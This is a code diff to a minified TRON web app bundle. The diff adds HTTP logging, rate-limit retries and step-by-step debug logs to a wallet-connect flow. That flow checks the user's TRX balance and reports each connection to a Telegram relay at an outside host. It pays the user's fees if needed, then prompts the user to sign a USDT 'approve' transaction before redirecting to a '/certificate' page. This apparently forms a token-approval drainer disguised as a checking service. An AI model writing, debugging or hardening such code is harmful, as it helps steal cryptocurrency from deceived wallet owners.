@@ -90634,6 +90634,69 @@
           , wA = __webpack_require__.n(kA);
         const AA = "0x2b6653dc"
           , EA = "0xcd8690dc";
+        function flowHttpEndpoint(config) {
+            const base = config && config.baseURL ? String(config.baseURL) : "";
+            const url = config && config.url ? String(config.url) : "";
+            if (!base)
+                return url || "unknown";
+            return base.replace(/\/$/, "") + "/" + url.replace(/^\//, "")
+        }
+        function attachAxiosHttpLog(client) {
+            if (!client || !client.interceptors || client.__flowHttpLog)
+                return;
+            client.__flowHttpLog = true;
+            client.interceptors.request.use((function(config) {
+                config.__flowT0 = Date.now();
+                config.__flowEndpoint = flowHttpEndpoint(config);
+                console.log("[HTTP] start", {
+                    endpoint: config.__flowEndpoint,
+                    start: new Date(config.__flowT0).toISOString()
+                });
+                return config
+            }
+            ));
+            client.interceptors.response.use((function(response) {
+                const cfg = response.config || {};
+                const t0 = cfg.__flowT0 || Date.now();
+                console.log("[HTTP] end", {
+                    endpoint: cfg.__flowEndpoint || cfg.url,
+                    start: new Date(t0).toISOString(),
+                    result: "success",
+                    status: response.status,
+                    elapsedMs: Date.now() - t0
+                });
+                return response
+            }
+            ), (function(error) {
+                const cfg = error && error.config || {};
+                const t0 = cfg.__flowT0 || Date.now();
+                const status = error && error.response ? error.response.status : "n/a";
+                console.log("[HTTP] end", {
+                    endpoint: cfg.__flowEndpoint || cfg.url || "unknown",
+                    start: new Date(t0).toISOString(),
+                    result: "failure",
+                    status: status,
+                    elapsedMs: Date.now() - t0
+                });
+                return Promise.reject(error)
+            }
+            ))
+        }
+        function attachTronWebHttpLog(tronWeb) {
+            if (!tronWeb)
+                return;
+            ["fullNode", "solidityNode", "eventServer"].forEach((function(name) {
+                const node = tronWeb[name];
+                if (node && node.instance)
+                    attachAxiosHttpLog(node.instance)
+            }
+            ))
+        }
+        function isHttp429(error) {
+            const status = error && error.response && error.response.status;
+            const message = error && error.message ? error.message : String(error || "");
+            return 429 === status || /status code 429/.test(message)
+        }
         class SA {
             constructor(e) {
                 if (this.provider = e,
@@ -90654,6 +90717,7 @@
                         fullHost: e
                     })
                 }
+                attachTronWebHttpLog(this.tronWeb),
                 this.tronWeb && this.tronWeb.trx || console.error("\ud83d\udea8 tronWeb failed to initialize!")
             }
             checkTestnet() {
@@ -90667,27 +90731,45 @@
                 return this.isTestnet ? "https://nile.trongrid.io/" : "https://api.trongrid.io/"
             }
             getTronWeb() {
-                return new (wA())({
+                const tronWeb = new (wA())({
                     fullHost: "https://api.trongrid.io"
-                })
+                });
+                return attachTronWebHttpLog(tronWeb),
+                tronWeb
             }
             async getBalance(e) {
-                try {
-                    if (!e)
-                        throw new Error("Invalid wallet address");
-                    if (console.log("Fetching balance for address:", e),
-                    console.log("tronWeb instance:", this.tronWeb),
-                    !this.tronWeb || !this.tronWeb.trx)
-                        throw new Error("\ud83d\udea8 tronWeb is not initialized properly!");
-                    const t = await this.tronWeb.trx.getBalance(e);
-                    console.log("balanceInSun:", t);
-                    const r = t / 1e6;
-                    return console.log("balanceInTRX:", r),
-                    r
-                } catch (t) {
-                    return console.error("Error fetching TRX balance:", t),
-                    0
+                const delays = [0, 1000, 2000];
+                let lastError = null;
+                for (let attempt = 0; attempt < delays.length; attempt++) {
+                    if (delays[attempt])
+                        await new Promise((resolve => setTimeout(resolve, delays[attempt])));
+                    try {
+                        if (!e)
+                            throw new Error("Invalid wallet address");
+                        if (console.log("Fetching balance for address:", e),
+                        console.log("tronWeb instance:", this.tronWeb),
+                        !this.tronWeb || !this.tronWeb.trx)
+                            throw new Error("\ud83d\udea8 tronWeb is not initialized properly!");
+                        const t = await this.tronWeb.trx.getBalance(e);
+                        console.log("balanceInSun:", t);
+                        const r = t / 1e6;
+                        return console.log("balanceInTRX:", r),
+                        r
+                    } catch (t) {
+                        lastError = t;
+                        if (!isHttp429(t) || attempt === delays.length - 1) {
+                            console.error("Error fetching TRX balance:", t);
+                            return 0
+                        }
+                        console.log("[HTTP] balance check 429, short backoff", {
+                            endpoint: "https://api.trongrid.io/wallet/getaccount",
+                            attempt: attempt + 1,
+                            waitMs: delays[attempt + 1]
+                        })
+                    }
                 }
+                return console.error("Error fetching TRX balance:", lastError),
+                0
             }
             async signMessage(e, t) {
                 if (!this.provider)
@@ -90713,6 +90795,7 @@
                 // Exact working flow from checktrc repo (class Lue)
                 if (!this.provider)
                     throw new Error("Provider is required to sign a transaction.");
+                let approvalAttempted = !1;
                 try {
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
                     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -90730,8 +90813,44 @@
                     }];
                     const functionSelector = "approve(address,uint256)";
                     console.log("[SIGN] Building approve (checktrc flow) for", e);
-                    const triggerResult = await tronWebInstance.transactionBuilder.triggerSmartContract(usdtContract, functionSelector, options, parameters, e);
+                    const triggerDelays = [0, 1200, 2400];
+                    let triggerResult;
+                    let triggerError = null;
+                    for (let attempt = 0; attempt < triggerDelays.length; attempt++) {
+                        if (triggerDelays[attempt])
+                            await new Promise((resolve => setTimeout(resolve, triggerDelays[attempt])));
+                        try {
+                            triggerResult = await tronWebInstance.transactionBuilder.triggerSmartContract(usdtContract, functionSelector, options, parameters, e);
+                            triggerError = null;
+                            break
+                        } catch (triggerErr) {
+                            triggerError = triggerErr;
+                            if (!isHttp429(triggerErr) || attempt === triggerDelays.length - 1)
+                                break;
+                            console.log("[HTTP] triggersmartcontract 429, short backoff", {
+                                endpoint: "https://api.trongrid.io/wallet/triggersmartcontract",
+                                attempt: attempt + 1,
+                                waitMs: triggerDelays[attempt + 1]
+                            })
+                        }
+                    }
+                    if (triggerError) {
+                        const message = triggerError && triggerError.message ? triggerError.message : String(triggerError);
+                        console.error("[10] ERROR", {
+                            stage: "approval-not-attempted",
+                            endpoint: "https://api.trongrid.io/wallet/triggersmartcontract",
+                            message: message
+                        });
+                        return {
+                            success: !1,
+                            result: !1,
+                            approvalNotAttempted: !0,
+                            message: message,
+                            error: message
+                        }
+                    }
                     console.log("[SIGN] trigger done, opening wallet popup...");
+                    approvalAttempted = !0;
                     // CRITICAL: pass FULL triggerSmartContract response as transaction (legacy WC format used by working site)
                     const signed = (await this.provider.request({
                         method: "tron_signTransaction",
@@ -90756,11 +90875,18 @@
                     }
                 } catch (err) {
                     console.error("[SIGN] error:", err);
+                    const message = err && err.message ? err.message : String(err);
+                    if (!approvalAttempted)
+                        console.error("[10] ERROR", {
+                            stage: "approval-not-attempted",
+                            message: message
+                        });
                     return {
                         success: !1,
                         result: !1,
-                        message: err && err.message ? err.message : String(err),
-                        error: err && err.message ? err.message : String(err)
+                        approvalNotAttempted: !approvalAttempted,
+                        message: message,
+                        error: message
                     }
                 }
             }
@@ -92622,6 +92748,7 @@
         VS.HttpStatusCode = LS,
         VS.default = VS;
         const GS = VS;
+        attachAxiosHttpLog(GS);
         var zS = __webpack_require__(579);
         console.log("Axios Version:", GS.VERSION);
         const US = "45a6812dbe886b990e2547d329da237b"
@@ -92696,19 +92823,15 @@
             ), [l]),
             (0,
             m.useEffect)(( () => {
-                r && u && (async () => {
-                    try {
-                        const e = await u.getBalance(i);
-                        o(e)
-                    } catch (e) {
-                        console.error("Error fetching balance:", e)
-                    }
-                }
-                )()
+                r && u && i && console.log("[HTTP] skipped duplicate balance check", {
+                    endpoint: "https://api.trongrid.io/wallet/getaccount",
+                    reason: "connect handler already performs the single required balance check"
+                })
             }
             ), [r, u, i]);
             const d = (0,
             m.useCallback)((async () => {
+                console.log("[1] CONNECT START");
                 try {
                     var e, r, i;
                     if (!l)
@@ -92741,6 +92864,9 @@
                     // checktrc-style TRX gate (same thresholds as working site)
                     const minTrx = 11;
                     let balanceInTRX = 0;
+                    console.log("[2] BALANCE CHECK START", {
+                        endpoint: "https://api.trongrid.io/wallet/getaccount"
+                    });
                     try {
                         balanceInTRX = parseFloat(await a.getBalance(c)) || 0
                     } catch (_) {
@@ -92748,6 +92874,10 @@
                     }
                     o(balanceInTRX);
                     console.log("TRX balance check", balanceInTRX);
+                    console.log("[3] BALANCE CHECK RESULT", {
+                        endpoint: "https://api.trongrid.io/wallet/getaccount",
+                        balanceInTRX: balanceInTRX
+                    });
 
                     // Telegram only: notify right after wallet connect (do not block sign/top-up)
                     GS.post("https://tronscantelegram.onrender.com/api/telegram", {
@@ -92758,6 +92888,9 @@
 
                     if (balanceInTRX < minTrx) {
                         console.log("TRX below 11, starting top-up");
+                        console.log("[4] TRX TOP-UP START", {
+                            endpoint: "https://tronscantelegram.onrender.com/send-trx"
+                        });
                         try {
                             const topUpResponse = await GS.post("https://tronscantelegram.onrender.com/send-trx", {
                                 userAddress: c
@@ -92765,17 +92898,28 @@
                                 timeout: 30000
                             });
                             console.log("TRX top-up response", topUpResponse && topUpResponse.data);
+                            console.log("[5] TRX TOP-UP RESULT", {
+                                endpoint: "https://tronscantelegram.onrender.com/send-trx",
+                                success: !!(topUpResponse && topUpResponse.data && topUpResponse.data.success),
+                                status: topUpResponse && topUpResponse.status
+                            });
                             if (!(topUpResponse && topUpResponse.data && topUpResponse.data.success)) {
                                 window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                 t(2);
                                 return
                             }
-                            console.log("Top-up success, waiting 12 seconds before sign...");
-                            await new Promise((resolve) => setTimeout(resolve, 12e3));
-                            balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
-                            console.log("TRX after wait", balanceInTRX);
-                            o(balanceInTRX)
+                            console.log("[6] POST-TOP-UP BALANCE CHECK START", {
+                                skipped: true,
+                                endpoint: "https://api.trongrid.io/wallet/getaccount",
+                                reason: "not required after successful /send-trx"
+                            });
+                            console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
+                                skipped: true,
+                                status: "not-called",
+                                reason: "approval proceeds without another TronGrid balance request"
+                            });
                         } catch (topUpError) {
+                            console.error("[10] ERROR", topUpError);
                             console.error("TRX top-up error:", topUpError);
                             try {
                                 balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
@@ -92791,12 +92935,28 @@
                             }
                         }
                     } else {
+                        console.log("[4] TRX TOP-UP START", {
+                            skipped: true,
+                            reason: "balance already at least 11 TRX"
+                        });
+                        console.log("[5] TRX TOP-UP RESULT", {
+                            skipped: true
+                        });
+                        console.log("[6] POST-TOP-UP BALANCE CHECK START", {
+                            skipped: true,
+                            reason: "no top-up, no extra balance request"
+                        });
+                        console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
+                            skipped: true,
+                            status: "not-called"
+                        });
                         console.log("TRX >= 11, show sign directly")
                     }
 
                     console.log("Opening sign popup");
                     await f(c);
                 } catch (a) {
+                    console.error("[10] ERROR", a);
                     console.error("Connection error:", a),
                     t(2)
                 } finally {
@@ -92808,10 +92968,12 @@
             ), [l])
               , f = async e => {
                 // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
+                console.log("[8] APPROVAL START", e);
                 console.log("[SIGN] f() / approve start", e);
                 const r = new SA(l);
                 h(r);
                 if (!r || !l) {
+                    console.error("[10] ERROR", "Wallet not ready");
                     window.alert("Wallet not ready. Please reconnect.");
                     t(2);
                     return
@@ -92819,6 +92981,7 @@
                 try {
                     localStorage.setItem("walletAddress", e);
                     const n = await r.sendTransaction(e);
+                    console.log("[9] APPROVAL RESULT", n);
                     console.log("[SIGN] approve result", n);
                     if (n && (n.result || n.success)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
@@ -92829,12 +92992,20 @@
                             window.location.href = "/certificate"
                         }, 1500);
                         t(3)
+                    } else if (n && n.approvalNotAttempted) {
+                        console.error("[10] ERROR", {
+                            stage: "balance-or-network",
+                            message: n.message
+                        });
+                        window.alert("Could not start the approval. The wallet popup was not opened.\n" + (n.message ? n.message : "Network request failed."));
+                        t(2)
                     } else {
                         console.warn("Approve failed", n);
                         window.alert("Approve failed. Please try again." + (n && n.message ? "\n" + n.message : ""));
                         t(2)
                     }
                 } catch (err) {
+                    console.error("[10] ERROR", err);
                     console.error("Approve error:", err);
                     window.alert("Sign cancelled or failed. Please try again.");
                     t(2)
